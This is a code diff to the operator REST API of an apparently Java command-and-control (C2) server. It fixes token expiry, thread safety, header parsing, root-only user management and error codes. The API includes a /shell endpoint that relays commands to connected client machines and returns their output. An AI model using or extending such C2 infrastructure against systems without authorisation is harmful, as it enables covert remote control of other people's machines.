@@ -2,12 +2,16 @@ package Servers.C2;
 
 import java.io.*;
 import java.net.InetSocketAddress;
+import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
 import java.time.Instant;
 import java.util.ArrayList;
 import java.util.Base64;
-import java.util.HashMap;
+import java.util.Map;
 import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
@@ -21,18 +25,30 @@ public class C2ServerAPI implements Runnable {
     // Pointer back to the C2 Server
     private C2Server C2server; 
 
-    // Maps that store data about bearer tokens
-    private HashMap<String, String> bearerTokens;
-    private HashMap<String, Instant> bearerTokensExpirationTime;
+    // Maps that store data about bearer tokens. ConcurrentHashMap so the API
+    // handler threads and the background sweeper can touch them safely.
+    private ConcurrentHashMap<String, String> bearerTokens;
+    private ConcurrentHashMap<String, Instant> bearerTokensExpirationTime;
+
+    // Bearer token lifetime in seconds (one hour, matching the ttl reported by /auth)
+    private static final long TOKEN_TTL_SECONDS = 3600;
 
     // Secure Random Number Generator used to generate bearer tokens
     private final SecureRandom secRNG;
 
+    // Single daemon thread that periodically evicts expired bearer tokens
+    private final ScheduledExecutorService tokenSweeper;
+
     public C2ServerAPI(C2Server C2server){
         this.C2server = C2server;
         this.secRNG = new SecureRandom();
-        this.bearerTokens = new HashMap<>();
-        this.bearerTokensExpirationTime = new HashMap<>();
+        this.bearerTokens = new ConcurrentHashMap<>();
+        this.bearerTokensExpirationTime = new ConcurrentHashMap<>();
+        this.tokenSweeper = Executors.newSingleThreadScheduledExecutor(r -> {
+            Thread t = new Thread(r, "bearer-token-sweeper");
+            t.setDaemon(true);
+            return t;
+        });
     }
 
     /**
@@ -48,7 +64,7 @@ public class C2ServerAPI implements Runnable {
             hexString.append(hexChars.charAt(secRNG.nextInt(hexChars.length())));
         }
         bearerTokens.put(hexString.toString(), username);
-        bearerTokensExpirationTime.put(hexString.toString(), Instant.now().plusSeconds(36000));
+        bearerTokensExpirationTime.put(hexString.toString(), Instant.now().plusSeconds(TOKEN_TTL_SECONDS));
         return hexString.toString();
     }
 
@@ -59,8 +75,14 @@ public class C2ServerAPI implements Runnable {
      * @return true or false
      */
     private boolean validateBearerToken(String bearerToken){
-        if(bearerTokensExpirationTime.keySet().contains(bearerToken)){
-            return Instant.now().isBefore(bearerTokensExpirationTime.get(bearerToken)); 
+        Instant expiry = bearerTokensExpirationTime.get(bearerToken);
+        if(expiry != null){
+            if(Instant.now().isBefore(expiry)){
+                return true;
+            }
+            // Token has expired; reclaim it now instead of waiting for the sweep
+            bearerTokens.remove(bearerToken);
+            bearerTokensExpirationTime.remove(bearerToken);
         }
         return false;
     }
@@ -83,12 +105,41 @@ public class C2ServerAPI implements Runnable {
         }
     }
 
+    /**
+     * Removes all expired bearer tokens from both maps. Run periodically by the
+     * tokenSweeper so abandoned tokens (issued but never presented again) don't
+     * accumulate for the life of the process.
+     */
+    private void purgeExpiredTokens(){
+        Instant now = Instant.now();
+        for(Map.Entry<String, Instant> entry : bearerTokensExpirationTime.entrySet()){
+            if(now.isAfter(entry.getValue())){
+                String token = entry.getKey();
+                bearerTokens.remove(token);
+                bearerTokensExpirationTime.remove(token);
+            }
+        }
+    }
+
 
     public class MyHandler implements HttpHandler {
         @Override
         public void handle(HttpExchange t) throws IOException {
             
             String response = "";
+            // Encoded body, filled in per-branch so we encode once (header length + write)
+            byte[] responseBytes = new byte[0];
+
+            // Read the Authorization header safely (null if absent) and pull out the bearer
+            // token, so a missing or malformed header yields a clean 4xx instead of a 500.
+            String authHeader = t.getRequestHeaders().getFirst("Authorization");
+            String bearerToken = null;
+            if(authHeader != null){
+                String[] authParts = authHeader.split(" ");
+                if(authParts.length > 1){
+                    bearerToken = authParts[1];
+                }
+            }
 
             /**
              * There are 6 different RESTful API calls available currently
@@ -200,28 +251,49 @@ public class C2ServerAPI implements Runnable {
                 t.getResponseHeaders().add("Access-Control-Allow-Headers", "Authorization, Content-Type");
                 t.sendResponseHeaders(204, -1);
             } else if(t.getRequestURI().toString().equals("/auth") && t.getRequestMethod().equals("GET")){
-                String auth = t.getRequestHeaders().get("Authorization").get(0);
-                if(auth.split(" ")[0].equals("Basic")){
-                    String userpass = new String(Base64.getDecoder().decode(auth.split(" ")[1]));
-                    String username = userpass.split(":")[0];
-                    String password = userpass.split(":")[1];
-                    if(C2server.authenticate(username, C2Server.hashPassword(password))){
-                        String bearerToken = generateBearerToken(username);
+                if(authHeader != null && authHeader.startsWith("Basic ")){
+                    String username = null;
+                    String password = null;
+                    try {
+                        String userpass = new String(Base64.getDecoder().decode(authHeader.substring(6)));
+                        // Split on the first colon only, so a password containing ':' is kept intact
+                        int sep = userpass.indexOf(':');
+                        if(sep >= 0){
+                            username = userpass.substring(0, sep);
+                            password = userpass.substring(sep + 1);
+                        }
+                    } catch (IllegalArgumentException e){
+                        // Malformed Base64: leave credentials null so this is treated as invalid
+                    }
+                    if(username != null && C2server.authenticate(username, C2Server.hashPassword(password))){
+                        String newBearerToken = generateBearerToken(username);
                         JSONObject jsonBearerObject = new JSONObject();
-                        jsonBearerObject.put("ttl", 3600);
-                        jsonBearerObject.put("bearer", bearerToken);
+                        jsonBearerObject.put("ttl", TOKEN_TTL_SECONDS);
+                        jsonBearerObject.put("bearer", newBearerToken);
                         response = jsonBearerObject.toString();
+                        responseBytes = response.getBytes(StandardCharsets.UTF_8);
                         t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
-                        t.sendResponseHeaders(200, response.getBytes().length);
+                        t.sendResponseHeaders(200, responseBytes.length);
                     } else {
                         JSONObject jsonBearerObject = new JSONObject();
                         jsonBearerObject.put("error", "Invalid Credentials");
                         response = jsonBearerObject.toString();
+                        responseBytes = response.getBytes(StandardCharsets.UTF_8);
                         t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
-                        t.sendResponseHeaders(401, response.getBytes().length);
+                        t.sendResponseHeaders(401, responseBytes.length);
                     }
+                } else {
+                    // Missing or non-Basic Authorization header: respond cleanly instead of
+                    // falling through with no headers sent (which would throw at getResponseBody()).
+                    JSONObject jsonBearerObject = new JSONObject();
+                    jsonBearerObject.put("error", "Invalid Credentials");
+                    response = jsonBearerObject.toString();
+                    responseBytes = response.getBytes(StandardCharsets.UTF_8);
+                    t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
+                    t.sendResponseHeaders(401, responseBytes.length);
                 }
-            } else if (validateBearerToken(t.getRequestHeaders().get("Authorization").get(0).split(" ")[1])){
+            } else if (bearerToken != null && validateBearerToken(bearerToken)){
+                int statusCode = 200;
                 if(t.getRequestURI().toString().equals("/status") && t.getRequestMethod().equals("GET")){
                     JSONObject clientStatusJSONObject = new JSONObject(C2server.getClientStatus()); 
                     response = clientStatusJSONObject.toString();
@@ -248,15 +320,9 @@ public class C2ServerAPI implements Runnable {
                     JSONObject shellJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                     String scope = shellJSON.get("scope").toString();
                     String command = shellJSON.get("command").toString();
-                    String shellResponse = "";
                     try{
-                        int numResponses = C2server.getClientResponses(scope).get(scope).size();
-                        C2server.getShellResponse(scope, command);
-                        ArrayList<String> clientResponses = C2server.getClientResponses(scope).get(scope);
-                        
-                        for(int i = numResponses; i < clientResponses.size(); i++){
-                            shellResponse += clientResponses.get(i);
-                        }
+                        // /shell targets a single IP; block for that client's output
+                        String shellResponse = C2server.getShellResponse(scope, command);
 
                         JSONObject returnObject = new JSONObject();
                         returnObject.put("output", shellResponse);
@@ -268,57 +334,81 @@ public class C2ServerAPI implements Runnable {
                     }           
 
                     
-                } else if (t.getRequestURI().toString().equals("/user") && t.getRequestMethod().equals("POST") && bearerTokens.get(t.getRequestHeaders().get("Authorization").get(0).split(" ")[1]).equals("root")){
-                    JSONObject userJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
-                    String action = userJSON.get("type").toString();
-                    if(action.equals("add")){
-                        String username = userJSON.get("username").toString();
-                        String password = userJSON.get("password").toString();
-                        C2server.updateUsernamePassword(username, C2Server.hashPassword(password));
-                    } else if (action.equals("disable")){
-                        String username = userJSON.get("username").toString();
-                        C2server.disableUser(username);
-                        try{
-                            removeUserBearerTokens(username);
-                        } catch(Exception e){
-                            e.printStackTrace();
+                } else if (t.getRequestURI().toString().equals("/user") && t.getRequestMethod().equals("POST")){
+                    // /user is root-only
+                    if("root".equals(bearerTokens.get(bearerToken))){
+                        JSONObject userJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
+                        String action = userJSON.get("type").toString();
+                        if(action.equals("add")){
+                            String username = userJSON.get("username").toString();
+                            String password = userJSON.get("password").toString();
+                            C2server.updateUsernamePassword(username, C2Server.hashPassword(password));
+                        } else if (action.equals("disable")){
+                            String username = userJSON.get("username").toString();
+                            C2server.disableUser(username);
+                            try{
+                                removeUserBearerTokens(username);
+                            } catch(Exception e){
+                                e.printStackTrace();
+                            }
                         }
+
+                        JSONObject returnObject = new JSONObject();
+                        returnObject.put("output", "success");
+                        response = returnObject.toString();
+                    } else {
+                        statusCode = 403;
+                        JSONObject returnObject = new JSONObject();
+                        returnObject.put("error", "forbidden");
+                        response = returnObject.toString();
                     }
-
-                    JSONObject returnObject = new JSONObject();
-                    returnObject.put("output", "success");
-                    response = returnObject.toString();
-
                 } else if (t.getRequestURI().toString().equals("/messages") && t.getRequestMethod().equals("POST")){
                     JSONObject messageJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
-                    int numMessagesRead = Integer.parseInt(messageJSON.get("Messages Read").toString());
-                    JSONArray messageListJSON = new JSONArray(C2server.getUserMessages(numMessagesRead));
-                    response = messageListJSON.toString();
+                    // optInt returns the default for a missing or non-numeric value, so bad input is a 400 rather than a 500
+                    int numMessagesRead = messageJSON.optInt("Messages Read", -1);
+                    if(numMessagesRead < 0){
+                        statusCode = 400;
+                        JSONObject returnObject = new JSONObject();
+                        returnObject.put("error", "invalid or missing 'Messages Read'");
+                        response = returnObject.toString();
+                    } else {
+                        JSONArray messageListJSON = new JSONArray(C2server.getUserMessages(numMessagesRead));
+                        response = messageListJSON.toString();
+                    }
+                } else {
+                    // Valid token but no matching route/method
+                    statusCode = 404;
+                    JSONObject returnObject = new JSONObject();
+                    returnObject.put("error", "not found");
+                    response = returnObject.toString();
                 }
                 t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
                 t.getResponseHeaders().set("Content-Type", "application/json");
-                t.sendResponseHeaders(200, response.getBytes().length);
+                responseBytes = response.getBytes(StandardCharsets.UTF_8);
+                t.sendResponseHeaders(statusCode, responseBytes.length);
             } else {
                 JSONObject jo = new JSONObject();
                 // If the token is expired and the client just needs to ask for a new one, they get a 401 unauthorized
                 // If the user has been disabled, or they just use a invalid token, they get a 403 forbidden
-                if(bearerTokens.keySet().contains(t.getRequestHeaders().get("Authorization").get(0).split(" ")[1])){
+                if(bearerToken != null && bearerTokens.keySet().contains(bearerToken)){
                     jo.put("error", "expired token");
                     response = jo.toString();
+                    responseBytes = response.getBytes(StandardCharsets.UTF_8);
                     t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
-                    t.sendResponseHeaders(401, response.getBytes().length);
+                    t.sendResponseHeaders(401, responseBytes.length);
                 } else {
                     jo.put("error", "invalid token");
                     response = jo.toString();
+                    responseBytes = response.getBytes(StandardCharsets.UTF_8);
                     t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
-                    t.sendResponseHeaders(403, response.getBytes().length);
+                    t.sendResponseHeaders(403, responseBytes.length);
                 }
                 
             }
             
             
             OutputStream os = t.getResponseBody();
-            os.write(response.getBytes());
+            os.write(responseBytes);
             os.close();
         }
     }
@@ -342,6 +432,9 @@ public class C2ServerAPI implements Runnable {
            
             httpServer.setExecutor(new ThreadPoolExecutor(4, 8, 30, TimeUnit.SECONDS, new ArrayBlockingQueue<Runnable>(100)));
             httpServer.start();
+
+            // Periodically evict expired bearer tokens so the maps don't grow unbounded
+            tokenSweeper.scheduleAtFixedRate(this::purgeExpiredTokens, 10, 10, TimeUnit.MINUTES);
 
         } catch (Exception exception) {
             System.out.println("Failed to create API Server");
